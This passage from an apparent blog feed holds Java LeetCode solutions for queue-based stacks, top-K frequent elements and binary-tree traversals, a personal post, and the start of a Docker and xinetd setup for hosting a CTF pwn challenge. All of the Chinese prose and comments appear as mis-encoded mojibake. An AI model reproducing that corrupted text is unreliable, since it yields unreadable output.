<span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        que1.addLast(x);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> que1.size()-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(tmp&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            que1.addLast(que1.peekFirst());</span><br><span class="line">            que1.pollFirst();</span><br><span class="line">            tmp--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> que1.pollFirst();</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">top</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> que1.peekLast();</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">empty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> que1.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyStack obj = new MyStack();</span></span><br><span class="line"><span class="comment"> * obj.push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.top();</span></span><br><span class="line"><span class="comment"> * boolean param_4 = obj.empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm.0xf</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0xf/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0xf/</url>
      
        <content type="html"><![CDATA[<h4 id="å‰Kä¸ªé«˜é¢‘å…ƒç´ "><a href="#å‰Kä¸ªé«˜é¢‘å…ƒç´ " class="headerlink" title="å‰Kä¸ªé«˜é¢‘å…ƒç´ "></a>å‰Kä¸ªé«˜é¢‘å…ƒç´ </h4><p>link:<a href="https://leetcode.cn/problems/top-k-frequent-elements/">347. å‰ K ä¸ªé«˜é¢‘å…ƒç´  - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>å¯¹äºç»Ÿè®¡å…ƒç´ å‡ºç°çš„é¢‘ç‡ï¼Œè¿™ä¸€ç±»é—®é¢˜å¯ä»¥ç”¨mapæ¥è¿›è¡Œç»Ÿè®¡ï¼ˆkeyå’Œvalueæ— æ•Œï¼‰keyå­˜æ”¾å…ƒç´ ï¼Œvalueå­˜æ”¾å‡ºç°çš„é¢‘ç‡.<br>å…¶å®æœ€å¼€å§‹æƒ³åˆ°çš„æ˜¯æš´åŠ›çš„éå†å¾ªç¯ï¼Œé€ä¸ªåˆ¤æ–­è®¡æ•°æ’åˆ—ï¼Œå‰”é™¤å‡ºç°é¢‘ç‡æœ€å°çš„å…ƒç´ .æƒ³ç”¨setä½†æ˜¯ä¸åŒ¹é…ç»Ÿè®¡é¢‘ç‡çš„è¦æ±‚.å°±éœ€è¦Setå’ŒLsitç»“åˆ.æœ€åå‘ç°è¿˜æ˜¯ç¦»ä¸å¼€å¿ƒçˆ±çš„mapå•Šï¼ˆå¤§é¡¶å †ç§’äº†ï¼‰</p><h6 id="å¤§é¡¶å †å®ç°"><a href="#å¤§é¡¶å †å®ç°" class="headerlink" title="å¤§é¡¶å †å®ç°"></a>å¤§é¡¶å †å®ç°</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºMap</span></span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums) &#123;</span><br><span class="line">            <span class="comment">//ç¡®ä¿æ›´æ–°å…ƒç´ </span></span><br><span class="line">            map.put(num,map.getOrDefault(num,<span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//ä¼˜å…ˆçº§é˜Ÿåˆ—å­˜å‚¨(numï¼Œcount)æŒ‰ä»å¤§åˆ°å°æ’</span></span><br><span class="line">        PriorityQueue&lt;<span class="type">int</span>[]&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((pair,pair1)-&gt;pair1[<span class="number">1</span>]-pair[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;Integer,Integer&gt;entry:map.entrySet())&#123;</span><br><span class="line">            pq.add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;entry.getKey(),entry.getValue()&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[k];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            result[i] = pq.poll()[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="å°é¡¶å †å®ç°"><a href="#å°é¡¶å †å®ç°" class="headerlink" title="å°é¡¶å †å®ç°"></a>å°é¡¶å †å®ç°</h6><p><strong>æ³¨æ„ å°é¡¶å †ç”±äºå‡ºç°é¢‘ç‡å°‘çš„åœ¨å‰é¢ æ‰€ä»¥è¦å…ˆå‰”é™¤é¢‘ç‡æœ€å°çš„å…ƒç´ ä»¥åŠä¸è¶³kä¸ªçš„æƒ…å†µå•ç‹¬ä¼˜å…ˆè€ƒè™‘</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();<span class="comment">//keyä¸ºæ•°ç»„å…ƒç´ å€¼,valä¸ºå¯¹åº”å‡ºç°æ¬¡æ•°</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            map.put(num,map.getOrDefault(num,<span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//å‡ºç°æ¬¡æ•°æœ€ä½çš„åœ¨é˜Ÿå¤´</span></span><br><span class="line">        PriorityQueue&lt;<span class="type">int</span>[]&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((pair1,pair2)-&gt;pair1[<span class="number">1</span>]-pair2[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;Integer,Integer&gt; entry:map.entrySet())&#123;</span><br><span class="line">            <span class="comment">//å°é¡¶å †åªéœ€è¦ç»´æŒkä¸ªå…ƒç´ æœ‰åº</span></span><br><span class="line">            <span class="keyword">if</span>(pq.size()&lt;k)&#123;</span><br><span class="line">                <span class="comment">//å°é¡¶å †å…ƒç´ ä¸ªæ•°å°äºkä¸ªæ—¶ç›´æ¥åŠ </span></span><br><span class="line">                pq.add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;entry.getKey(),entry.getValue()&#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(entry.getValue()&gt;pq.peek()[<span class="number">1</span>])&#123;</span><br><span class="line">                    <span class="comment">//å½“å‰å…ƒç´ å‡ºç°æ¬¡æ•°å¤§äºå°é¡¶å †çš„æ ¹ç»“ç‚¹(è¿™kä¸ªå…ƒç´ ä¸­å‡ºç°æ¬¡æ•°æœ€å°‘çš„é‚£ä¸ª)</span></span><br><span class="line">                    pq.poll();</span><br><span class="line">                    <span class="comment">//å¼¹å‡ºé˜Ÿå¤´(å°é¡¶å †çš„æ ¹ç»“ç‚¹),å³æŠŠå †é‡Œå‡ºç°æ¬¡æ•°æœ€å°‘çš„é‚£ä¸ªåˆ é™¤,ç•™ä¸‹çš„å°±æ˜¯å‡ºç°æ¬¡æ•°å¤šçš„äº†</span></span><br><span class="line">                    pq.add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;entry.getKey(),entry.getValue()&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] ans = <span class="keyword">new</span> <span class="title class_">int</span>[k];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=k-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="comment">//ä¾æ¬¡å¼¹å‡ºå°é¡¶å †,å…ˆå¼¹å‡ºçš„æ˜¯å †çš„æ ¹,å‡ºç°æ¬¡æ•°å°‘,åé¢å¼¹å‡ºçš„å‡ºç°æ¬¡æ•°å¤š</span></span><br><span class="line">            ans[i] = pq.poll()[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥äºŒå‰æ ‘åŸºç¡€éå† é€’å½’ç§’äº†<br>é€’å½’æ³¨æ„ä¸‰è¦ç´ ï¼ˆæ¥è‡ªä»£ç éšæƒ³å½•ï¼‰<br><strong>1.ç¡®å®šé€’å½’å‡½æ•°çš„å‚æ•°å’Œè¿”å›å€¼</strong><br><strong>2.ç¡®å®šç»ˆæ­¢æ¡ä»¶</strong><br><strong>3.ç¡®å®šå•å±‚é€’å½’çš„é€»è¾‘</strong></p><h4 id="äºŒå‰æ ‘çš„å‰åºéå†"><a href="#äºŒå‰æ ‘çš„å‰åºéå†" class="headerlink" title="äºŒå‰æ ‘çš„å‰åºéå†"></a>äºŒå‰æ ‘çš„å‰åºéå†</h4><p>linkï¼š<a href="https://leetcode.cn/problems/binary-tree-preorder-traversal/description/">144. äºŒå‰æ ‘çš„å‰åºéå† - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><h6 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h6><p>ä½¿ç”¨ArrayList</p><p><strong>åŠ¨æ€å¤§å°</strong>ï¼š<code>ArrayList</code> å¯ä»¥æ ¹æ®éœ€è¦åŠ¨æ€è°ƒæ•´å¤§å°ï¼Œé€‚åˆåœ¨ä¸çŸ¥é“æœ€ç»ˆèŠ‚ç‚¹æ•°ç›®çš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚</p><p><strong>å¿«é€Ÿéšæœºè®¿é—®</strong>ï¼š<code>ArrayList</code> æä¾› O(1) çš„æ—¶é—´å¤æ‚åº¦æ¥è®¿é—®å…ƒç´ ï¼Œè¿™åœ¨éœ€è¦é¢‘ç¹è¯»å–ç»“æœæ—¶éå¸¸é«˜æ•ˆã€‚</p><p><strong>ç®€å•æ˜“ç”¨</strong>ï¼š<code>ArrayList</code> çš„ API è®¾è®¡ç®€å•ï¼Œæä¾›äº†æ–¹ä¾¿çš„æ–¹æ³•ï¼ˆå¦‚ <code>add</code>ï¼‰æ¥æ·»åŠ å…ƒç´ ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        preOrder(root,list);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å‰åºéå†é€’å½’ ä¸­å·¦å³ æ— è¿”å›å€¼</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">(TreeNode cur,List&lt;Integer&gt; result)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        result.add(cur.val);</span><br><span class="line">        preOrder(cur.left,result);</span><br><span class="line">        preOrder(cur.right,result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="äºŒå‰æ ‘çš„ä¸­åºéå†"><a href="#äºŒå‰æ ‘çš„ä¸­åºéå†" class="headerlink" title="äºŒå‰æ ‘çš„ä¸­åºéå†"></a>äºŒå‰æ ‘çš„ä¸­åºéå†</h4><p>linkï¼š<a href="https://leetcode.cn/problems/binary-tree-inorder-traversal/description/">94. äºŒå‰æ ‘çš„ä¸­åºéå† - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-2"><a href="#æ€è·¯åˆ†æ-2" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        inOrder(root,list);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inOrder</span><span class="params">(TreeNode cur,List&lt;Integer&gt; list)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        inOrder(cur.left,list);</span><br><span class="line">        list.add(cur.val);</span><br><span class="line">        inOrder(cur.right,list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="äºŒå‰æ ‘çš„ååºéå†"><a href="#äºŒå‰æ ‘çš„ååºéå†" class="headerlink" title="äºŒå‰æ ‘çš„ååºéå†"></a>äºŒå‰æ ‘çš„ååºéå†</h4><p>linkï¼š<a href="https://leetcode.cn/problems/binary-tree-postorder-traversal/description/">145. äºŒå‰æ ‘çš„ååºéå† - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-3"><a href="#æ€è·¯åˆ†æ-3" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        postOrder(root,list);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postOrder</span><span class="params">(TreeNode cur,List&lt;Integer&gt; list)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        postOrder(cur.left,list);</span><br><span class="line">        postOrder(cur.right,list);</span><br><span class="line">        list.add(cur.val);  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm0.0</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm0.0/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm0.0/</url>
      
        <content type="html"><![CDATA[<h3 id="é—²è¨€ç¢è¯­"><a href="#é—²è¨€ç¢è¯­" class="headerlink" title="é—²è¨€ç¢è¯­"></a>é—²è¨€ç¢è¯­</h3><p>â€‹æ€æ¥æƒ³å»è¿˜æ˜¯æƒ³æŠŠä¹‹å‰æ‰“å¡çš„å†…å®¹æ¬è¿‡æ¥ï¼ˆæ¯•ç«Ÿåšå®¢ä¿®ä¿®è¡¥è¡¥è¿˜æ˜¯å‹‰å¼ºå¯ä»¥å‡‘åˆçœ‹ ç¬‘ï¼‰è¿˜æ˜¯ä½œä¸ºè‡ªå·±çš„ç‚¹æ»´è®°å½•å§.ã€æ˜¯çš„çœ‹åˆ°çš„æ—¥æœŸä¸€æ ·çš„çº¯å±æ˜¯æ‡’å¾—æ”¹ ä¸è¦å­¦ä¹ æ‡’æƒ°ã€‘<br>â€‹wiå¸ˆå‚…è¯´æ¯•è®¾æ‰‹æ“ä¸€ä¸ªè‡ªå·±çš„åšå®¢ç³»ç»ŸGitHubä¸Šèƒ½æœ‰å‡ åƒstaré‚£åŒ…è¿‡çš„ï¼Œå€’æ˜¯æœ‰è¿™ä¹ˆä¸ªæƒ³æ³•ï¼Œè¯´ä¸å®šè‡ªå·±å“ªå¤©ä¹Ÿå¯ä»¥å®ç°å‘¢.<br>â€‹ä¹‹åæ¬è¿è¿‡æ¥çš„å†…å®¹ä¹Ÿç®—æ˜¯å¤ä¹ äº†ï¼Œå¸Œæœ›è‡ªå·±èƒ½åœ¨è–„å¼±çš„æ–¹é¢è¶Šæ¥è¶Šå¥½.ã€è¿™ä¸ªæ—¶å€™åœ¨Harmonyå¼€å‘è¯¾ä¸Šæ’ç€è€³æœºä¸€ä¸ªäººpassion hhã€‘</p><p>å¸Œæœ›è‡ªå·±è¿™æ¬¡èƒ½çœŸæ­£åšæŒä¸‹æ¥.<br>(åœ¨å­¦ä¹ çš„å­¦å¼Ÿå­¦å¦¹ä»¬ä¹Ÿç»§ç»­åŠ æ²¹å“¦ æœŸå¾…ä½ ä»¬æˆä¸ºè‡ªå·±ç†æƒ³ä¸­çš„pwnâœŒ)</p><p>å…±å‹‰.</p>]]></content>
      
      
      <categories>
          
          <category> ç¢ç‰‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¢ç‰‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockeréƒ¨ç½²å°è®°</title>
      <link href="/2024/11/04/Docker%E9%83%A8%E7%BD%B2%E5%B0%8F%E8%AE%B0/"/>
      <url>/2024/11/04/Docker%E9%83%A8%E7%BD%B2%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>ä¸Šæ¬¡å‡ºé¢˜è¿˜æ˜¯ä¸Šæ¬¡ï¼Œå¥½å¤šæŒ‡ä»¤å·²ç»è®°ä¸æ¸…äº†.<br>æš‚æ—¶å†™åœ¨è¿™é‡Œï¼Œç»™è‡ªå·±ä¹Ÿç»™ä»¥åçš„ä½ ä»¬æŸ¥é˜….</p><h3 id="æœ‰ç”¨çš„å·¥å…·"><a href="#æœ‰ç”¨çš„å·¥å…·" class="headerlink" title="æœ‰ç”¨çš„å·¥å…·"></a>æœ‰ç”¨çš„å·¥å…·</h3><p>å¦‚æœä½ å»å–œæ¬¢çš„æµè§ˆå™¨æœç´¢ï¼Œä¸éš¾å‘ç°xinetdç¡®å®å¾ˆå®ç”¨.(ç¬‘)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Eadom/ctf_xinetd.git</span><br></pre></td></tr></table></figure><p>å®‰è£…ä¹‹åå‘ç°é•¿è¿™æ ·<br><img src="/../imgs/2024-10/QQ%E6%88%AA%E5%9B%BE20241107230639.png"></p><p>æ‰‹æ“docker-compose.ymlï¼ˆä¸ä¼šä¹Ÿå¯ä»¥æ‰¾äººæœºhhï¼‰.</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">pwn:</span></span><br><span class="line">        <span class="attr">build:</span> <span class="string">./</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">pwn</span> <span class="comment">#è¿™é‡Œçš„imageå†™è‡ªå·±åˆ›å»ºçš„é•œåƒå</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;60001:9999&quot;</span></span><br><span class="line">        <span class="attr">pids_limit:</span> <span class="number">1024</span></span><br><span class="line">        <span class="comment"># cpus: 0.5</span></span><br><span class="line">        <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">        <span class="comment"># privileged: true</span></span><br></pre></td></tr></table></figure><p><strong>ctf.xinetdæ–‡ä»¶</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = 9999</span><br><span class="line">    bind        = 0.0.0.0</span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    # replace helloworld to your program</span><br><span class="line">    server_args = --userspec=1000:1000 /home/ctf ./oneChance</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    # safety options</span><br><span class="line">  